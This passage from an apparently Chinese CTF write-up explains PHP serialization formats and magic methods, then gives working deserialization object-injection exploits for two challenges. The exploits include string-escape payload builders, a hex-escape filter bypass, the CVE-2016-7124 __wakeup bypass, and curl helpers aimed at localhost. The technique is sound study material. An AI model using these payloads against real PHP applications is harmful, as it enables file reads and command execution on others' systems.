   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">MyClass</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">   </span>&#123;
     <span class="hljs-keyword">$this</span>-&gt;member = <span class="hljs-string">&#x27;member value&#x27;</span>;
   &#125;
 
   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">   </span>&#123;
     <span class="hljs-keyword">return</span> wddx_serialize_value(<span class="hljs-keyword">$this</span>-&gt;member);
   &#125;
 
   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unserialize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>
<span class="hljs-function">   </span>&#123;
     <span class="hljs-keyword">$this</span>-&gt;member = wddx_deserialize(<span class="hljs-variable">$data</span>);
   &#125;
&#125;
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> MyClass();
<span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;
print_r(unserialize(serialize(<span class="hljs-variable">$a</span>)));</code></pre></div>

<p>输出结果为（浏览器中的源代码）：</p>
<p>C:7:”MyClass”:90:{<wddxPacket version='1.0'><header/><data><string>member value</string></data></wddxPacket>}<br>MyClass Object<br>(<br>   [member] =&gt; member value<br>)</p>
<p>因此如果想用其它语言来实现 PHP 序列化中的 C 标示的话，也需要提供一种这样的机制，让用户自定义类时,能够自己在反序列化时处理 <data> 内容，否则，这些内容就无法被反序列化了。</p>
<h3 id="7．Unicode-字符串的序列化"><a href="#7．Unicode-字符串的序列化" class="headerlink" title="7．Unicode 字符串的序列化"></a>7．Unicode 字符串的序列化</h3><p>好了，最后再谈谈 PHP 6 中关于 Unicode 字符串序列化的问题吧。</p>
<p>说实话，我不怎么喜欢把字符串搞成双字节 Unicode 这种编码的东西。JavaScript 中也是用这样的字符串，因此在处理字节流的东西时，反而非常的不方便。C# 虽然也是用这种方式来编码字符串，不过还好的是，它提供了全面的编码转换机制，而且提供这种字符串到字节流（实际上是到字节数组）的转换，所以处理起来还 算是可以。但是对于不熟悉这个的人来说，转来转去就是个麻烦。</p>
<p>PHP 6 之前一直是按字节来编码字符串的，到了 PHP 6 突然冒出个 Unicode 编码的字符串来，虽然是可选的，但仍然让人觉得非常不舒服，如果配置不当，老的程序兼容性都成问题。</p>
<p>当然加了这个东西以后，许多老的与字符串有关的函数都进行了修改。序列化函数也不例外。因此，PHP 6 中增加了专门的 Unicode 字符串序列化标示 U。PHP 6 中对 Unicode 字符串的序列化格式如下：</p>
<p>U:<length>:”<unicode string>“;</p>
<p>这里 <length> 是指原 Unicode String 的长度，而不是 <unicode string> 的长度，因为 <unicode string> 是经过编码以后的字节流了。</p>
<p>但是还有一点要注意，<length> 尽管是原 Unicode String 的长度，但是也不是只它的字节数，当然也不完全是指它的字符数，确切的说是之它的字符单位数。因为 Unicode String 中采用的是 UTF16 编码，这种编码方式使用 16 位来表示一个字符的，但是并不是所有的都是可以用 16 位表示的，因此有些字符需要两个 16 位来表示一个字符。因此，在 UTF16 编码中，16 位字符算作一个字符单位，一个实际的字符可能就是一个字符单位，也有可能由两个字符单位组成。因此， Unicode String 中字符数并不总是等于字符单位数，而这里的 <length> 指的就是字符单位数，而不是字符数。</p>
<p>那 <unicode string> 又是怎样被编码的呢？实际上，它的编码也很简单，对于编码小于 128 的字符（但不包括 \），按照单个字节写入，对于大于 128 的字符和 \ 字符，则转化为 16 进制编码的字符串，以 \ 作为开头，后面四个字节分别是这个字符单位的 16 进制编码，顺序按照由高位到低位排列，也就是第 16-13 位所对应的16进制数字字符（abcdef 这几个字母是小写）作为第一个字节，第 12-9 位作为第二个字节，第 8-5 位作为第三个字节，最后的第 4-1 位作为第四个字节。依次编码下来，得到的就是 <uncode string> 的内容了。</p>
<p>我认为对于其他语言来说，没有必要实现这种序列化方式，因为用这种方式序列化的内容，对于目前的主流 PHP 服务器来说都是不支持的，不过倒是可以实现它的反序列化，这样将来即使跟 PHP 6 进行数据交换，也可以互相读懂了。</p>
<h2 id="0x02-php反序列化魔术方法"><a href="#0x02-php反序列化魔术方法" class="headerlink" title="0x02 php反序列化魔术方法"></a>0x02 php反序列化魔术方法</h2><h3 id="方法列表"><a href="#方法列表" class="headerlink" title="方法列表"></a>方法列表</h3><div class="hljs code-wrapper"><pre><code class="hljs php">起点：
__destruct() <span class="hljs-comment">//对象被销毁时触发</span>
__wakeup() <span class="hljs-comment">//unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</span>
__toString() <span class="hljs-comment">//__toString() 方法用于一个类被当成字符串时应怎样回应</span>
   

中间跳板：
__call() <span class="hljs-comment">//在对象上下文中调用不可访问的方法时触发</span>
__callStatic() <span class="hljs-comment">//在静态上下文中调用不可访问的方法时触发</span>
__get() <span class="hljs-comment">//用于从不可访问的属性读取数据</span>
__set() <span class="hljs-comment">//用于将数据写入不可访问的属性</span>
__isset() <span class="hljs-comment">//在不可访问的属性上调用isset()或empty()触发</span>
__unset() <span class="hljs-comment">//在不可访问的属性上使用unset()时触发</span>
__invoke() <span class="hljs-comment">//当脚本尝试将对象调用为函数时触发</span>
__toString() <span class="hljs-comment">//</span>

终点：
__call: 调用不可访问或不存在的方法时被调用
call_user_func、call_user_func_array等代码执行点
    
其他：
__construct()<span class="hljs-comment">//创建对象时触发0</span>
__sleep() <span class="hljs-comment">//对象被序列化之前触发</span></code></pre></div>



<h3 id="toString-方法触发条件"><a href="#toString-方法触发条件" class="headerlink" title="__toString 方法触发条件"></a>__toString 方法触发条件</h3><p>这个 __toString 触发的条件比较多，也因为这个原因容易被忽略，常见的触发条件有下面几种</p>
<blockquote>
<p>(1)echo (<code>$obj</code>) / print(<code>$obj</code>) 打印时会触发</p>
<p>(2)反序列化对象与字符串连接时</p>
<p>(3)反序列化对象参与格式化字符串时</p>
<p>(4)反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）</p>
<p>(5)反序列化对象参与格式化SQL语句，绑定参数时</p>
<p>(6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时</p>
<p>(7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有<strong>toString返回的字符串的时候</strong>toString会被调用</p>
<p>(8)反序列化的对象作为 class_exists() 的参数的时候</p>
<p>(9)作为file_exists()函数时也会触发</p>
</blockquote>
<h3 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="__wakeup绕过"></a>__wakeup绕过</h3><p><strong>CVE-2016-7124</strong></p>
<p>在PHP 5.6.25 之前版本和 7.0.10 之前的版本，当对象的属性(变量)数大于实际的个数时， <code>__wakeup()</code> 不会被执行。</p>
<h2 id="0x03-php反序列化对象注入"><a href="#0x03-php反序列化对象注入" class="headerlink" title="0x03 php反序列化对象注入"></a>0x03 php反序列化对象注入</h2><h3 id="basic：安恒月赛web"><a href="#basic：安恒月赛web" class="headerlink" title="basic：安恒月赛web"></a>basic：安恒月赛web</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
show_source(<span class="hljs-string">&quot;index.php&quot;</span>);
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;
    <span class="hljs-keyword">return</span> str_replace(chr(<span class="hljs-number">0</span>) . <span class="hljs-string">&#x27;*&#x27;</span> . chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$data</span>);
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;
    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;\0\0\0&#x27;</span>, chr(<span class="hljs-number">0</span>) . <span class="hljs-string">&#x27;*&#x27;</span> . chr(<span class="hljs-number">0</span>), <span class="hljs-variable">$data</span>);
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$a</span>;
        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$b</span>;
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;gqy&#x27;</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;
        <span class="hljs-variable">$c</span> = <span class="hljs-string">&#x27;a&#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;b;
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>;
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;
        <span class="hljs-comment">//flag.php</span>
        <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;c);
        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;nice&#x27;</span>;
    &#125;
&#125;

<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> A(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);
<span class="hljs-comment">//省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span>
<span class="hljs-variable">$b</span> = unserialize(read(write(serialize(<span class="hljs-variable">$a</span>))));</code></pre></div>



<p>原理是通过对username长度的减小，导致username反序列化时将password部分视为自己的部分，则我们可以构造自己的序列化语句，注入自己想要的对象。</p>
<p><strong>payload</strong></p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;
    <span class="hljs-keyword">return</span> str_replace(chr(<span class="hljs-number">0</span>) . <span class="hljs-string">&#x27;*&#x27;</span> . chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$data</span>);
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;
    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;\0\0\0&#x27;</span>, chr(<span class="hljs-number">0</span>) . <span class="hljs-string">&#x27;*&#x27;</span> . chr(<span class="hljs-number">0</span>), <span class="hljs-variable">$data</span>);
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$a</span>;
        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$b</span>;
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;gqy&#x27;</span>;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;c = <span class="hljs-string">&quot;./flag&quot;</span>;
    &#125;
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">CURL</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;
    <span class="hljs-variable">$ch</span> = curl_init();
    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);
    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="hljs-literal">FALSE</span>);
    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="hljs-literal">FALSE</span>);
    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
    <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);
    curl_close(<span class="hljs-variable">$ch</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">padding</span>(<span class="hljs-params"><span class="hljs-variable">$poc</span></span>)</span>&#123;
    <span class="hljs-variable">$target</span> = <span class="hljs-string">&#x27;&quot;;s:8:&quot;password&quot;;s:72:&quot;1&#x27;</span>;
    <span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;drom&quot;</span>.str_repeat(<span class="hljs-string">&#x27;\0\0\0&#x27;</span>,strlen(<span class="hljs-variable">$target</span>)/<span class="hljs-number">3</span>);
    <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;1&#x27;</span>.<span class="hljs-string">&#x27;&quot;;s:4:&quot;drom&quot;;&#x27;</span>.<span class="hljs-variable">$poc</span>.<span class="hljs-string">&#x27;&#125;&#x27;</span>;  <span class="hljs-comment">//注入一个名称为drom对象，内容为pop链</span>
<span class="hljs-comment">//    echo $username,&quot;\n&quot;;</span>
<span class="hljs-comment">//    echo $password,&quot;\n&quot;;</span>
    <span class="hljs-variable">$args</span> = <span class="hljs-string">&#x27;?a=&#x27;</span>.urlencode(<span class="hljs-variable">$username</span>).<span class="hljs-string">&#x27;&amp;b=&#x27;</span>.urlencode(<span class="hljs-variable">$password</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$args</span>;
&#125;
<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> B();
<span class="hljs-variable">$b</span>-&gt;b = <span class="hljs-keyword">new</span> C();

<span class="hljs-keyword">echo</span> CURL(<span class="hljs-string">&#x27;http://127.0.0.1/ax/index.php&#x27;</span>.padding(serialize(<span class="hljs-variable">$b</span>)));


</code></pre></div>



<h3 id="加了绕过：强网杯web辅助"><a href="#加了绕过：强网杯web辅助" class="headerlink" title="加了绕过：强网杯web辅助"></a>加了绕过：强网杯web辅助</h3><p><strong>class.php</strong></p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">player</span></span>&#123;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$user</span>;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$pass</span>;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$admin</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span>, <span class="hljs-variable">$admin</span> = <span class="hljs-number">0</span></span>)</span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;user = <span class="hljs-variable">$user</span>;
        <span class="hljs-keyword">$this</span>-&gt;pass = <span class="hljs-variable">$pass</span>;
        <span class="hljs-keyword">$this</span>-&gt;admin = <span class="hljs-variable">$admin</span>;
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_admin</span>(<span class="hljs-params"></span>)</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;admin;
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">topsolo</span></span>&#123;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;Riven&#x27;</span></span>)</span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">TP</span>(<span class="hljs-params"></span>)</span>&#123;
        <span class="hljs-keyword">if</span> (gettype(<span class="hljs-keyword">$this</span>-&gt;name) === <span class="hljs-string">&quot;function&quot;</span> <span class="hljs-keyword">or</span> gettype(<span class="hljs-keyword">$this</span>-&gt;name) === <span class="hljs-string">&quot;object&quot;</span>)&#123;
            <span class="hljs-variable">$name</span> = <span class="hljs-keyword">$this</span>-&gt;name;
            <span class="hljs-variable">$name</span>();
        &#125;
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;TP();
    &#125;

&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">midsolo</span></span>&#123;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;name !== <span class="hljs-string">&#x27;Yasuo&#x27;</span>)&#123;
            <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-string">&#x27;Yasuo&#x27;</span>;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No Yasuo! No Soul!\n&quot;</span>;
        &#125;
    &#125;
    

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;Gank();
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Gank</span>(<span class="hljs-params"></span>)</span>&#123;
        <span class="hljs-keyword">if</span> (stristr(<span class="hljs-keyword">$this</span>-&gt;name, <span class="hljs-string">&#x27;Yasuo&#x27;</span>))&#123;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Are you orphan?\n&quot;</span>;
        &#125;
        <span class="hljs-keyword">else</span>&#123;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Must Be Yasuo!\n&quot;</span>;
        &#125;
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">jungle</span></span>&#123;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;Lee Sin&quot;</span></span>)</span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">KS</span>(<span class="hljs-params"></span>)</span>&#123;
        system(<span class="hljs-string">&quot;cat /flag&quot;</span>);
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;KS();  
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;  
    &#125;

&#125;
<span class="hljs-meta">?&gt;</span>
</code></pre></div>



<p><strong>common.php</strong></p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;
    <span class="hljs-variable">$data</span> = str_replace(<span class="hljs-string">&#x27;\0*\0&#x27;</span>, chr(<span class="hljs-number">0</span>).<span class="hljs-string">&quot;*&quot;</span>.chr(<span class="hljs-number">0</span>), <span class="hljs-variable">$data</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;
&#125;
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;
    <span class="hljs-variable">$data</span> = str_replace(chr(<span class="hljs-number">0</span>).<span class="hljs-string">&quot;*&quot;</span>.chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0*\0&#x27;</span>, <span class="hljs-variable">$data</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-keyword">if</span>(stristr(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;name&#x27;</span>)!==<span class="hljs-literal">False</span>)&#123;
        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Name Pass\n&quot;</span>);
    &#125;
    <span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;
    &#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>



<ul>
<li>pop链中的变量都变成了protected，反序列化时需格外注意。</li>
<li>read函数有变化，字符是从5个减小到3个。</li>
<li>绕过对于name的过滤，可以使用十六进制，然后使用S进行转义处理。否则无法正确处理十六进制</li>
<li>绕过__wakeup。</li>
</ul>
<p><strong>利用脚本</strong></p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">player</span></span>&#123;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$user</span>;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$pass</span>;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$admin</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span>, <span class="hljs-variable">$admin</span> = <span class="hljs-number">0</span></span>)</span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;user = <span class="hljs-variable">$user</span>;
        <span class="hljs-keyword">$this</span>-&gt;pass = <span class="hljs-variable">$pass</span>;
        <span class="hljs-keyword">$this</span>-&gt;admin = <span class="hljs-variable">$admin</span>;
    &#125;

&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">topsolo</span></span>&#123;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;Riven&#x27;</span></span>)</span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;
    &#125;

&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">midsolo</span></span>&#123;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">jungle</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;Lee Sin&quot;</span></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;
    &#125;
&#125;


<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">console</span>(<span class="hljs-params"><span class="hljs-variable">$line</span></span>)</span>&#123;
    <span class="hljs-variable">$arr</span> = explode(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-variable">$line</span>);
    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;sizeof(<span class="hljs-variable">$arr</span>);<span class="hljs-variable">$i</span>++)&#123;
        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/name/&#x27;</span>,<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>]))&#123;
            <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>] = str_replace(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&#x27;\6e\61\6d\65&#x27;</span>,<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>]);
            <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span><span class="hljs-number">-2</span>] = str_replace(<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span><span class="hljs-number">-2</span>]);
        &#125;
    &#125;
    <span class="hljs-variable">$result</span> = implode(<span class="hljs-variable">$arr</span>,<span class="hljs-string">&#x27;:&#x27;</span>);
    <span class="hljs-variable">$result</span> = str_replace(<span class="hljs-string">&#x27;&quot;midsolo&quot;:1:&#x27;</span>,<span class="hljs-string">&#x27;&quot;midsolo&quot;:2:&#x27;</span>,<span class="hljs-variable">$result</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pad</span>(<span class="hljs-params"><span class="hljs-variable">$poc</span></span>)</span>&#123;
    <span class="hljs-variable">$pad</span> = <span class="hljs-string">&#x27;&quot;;s:7:&quot; * pass&quot;;s:111:&quot;0&#x27;</span>;
    <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;drom&#x27;</span>.str_repeat(<span class="hljs-string">&#x27;\0*\0&#x27;</span>,(strlen(<span class="hljs-variable">$pad</span>))/<span class="hljs-number">2</span>);
    <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-string">&#x27;&quot;;s:4:&quot;drom&quot;;&#x27;</span>.<span class="hljs-variable">$poc</span>.<span class="hljs-string">&#x27;s:8:&quot;\0*\0admin&quot;;i:0;&#125;&#x27;</span>;
    <span class="hljs-variable">$args</span> = <span class="hljs-string">&#x27;?username=&#x27;</span>.urlencode(<span class="hljs-variable">$username</span>).<span class="hljs-string">&#x27;&amp;password=&#x27;</span>.urlencode(<span class="hljs-variable">$password</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$args</span>;
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">CURL</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;
    <span class="hljs-variable">$ch</span> = curl_init();
    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);
    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="hljs-literal">FALSE</span>);
    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="hljs-literal">FALSE</span>);
    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
    <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);
    curl_close(<span class="hljs-variable">$ch</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;
&#125;

